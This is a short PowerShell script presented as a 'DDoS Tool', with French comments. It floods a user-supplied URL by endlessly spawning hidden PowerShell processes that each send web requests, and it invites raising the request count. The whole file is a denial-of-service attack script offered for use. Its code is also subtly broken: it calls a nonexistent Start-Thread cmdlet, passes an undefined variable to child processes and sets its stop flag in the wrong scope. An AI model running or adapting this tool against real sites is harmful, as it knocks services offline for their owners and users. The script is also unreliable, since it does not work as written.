# DDoS Tool - by SK
param (
    [string]$targetUrl,
    [int]$requestCount = 10000  # Nombre de requêtes à envoyer que tu peux augmenter jusqu'a 99999
)

$stopRequest = $false

function Start-DDoS {
    while (-not $stopRequest) {
        for ($i = 0; $i -lt $requestCount; $i++) {
            Start-Process "powershell" -ArgumentList "-NoProfile -Command `""Invoke-WebRequest -Uri `$targetUrl `"" -WindowStyle Hidden" -NoNewWindow
        }
    }
}

Start-Thread -ScriptBlock { Start-DDoS }

# Fonction pour arrêter le DDoS
function Stop-DDoS {
    $stopRequest = $true
    Write-Output "DDoS stopped."
}

# Commande pour arrêter le DDoS
Register-ObjectEvent -InputObject $null -EventName "StopDDoS" -Action { Stop-DDoS }

# Exemple d'utilisation :
# Start-DDoS
# Pour arrêter, appelle Stop-DDoS
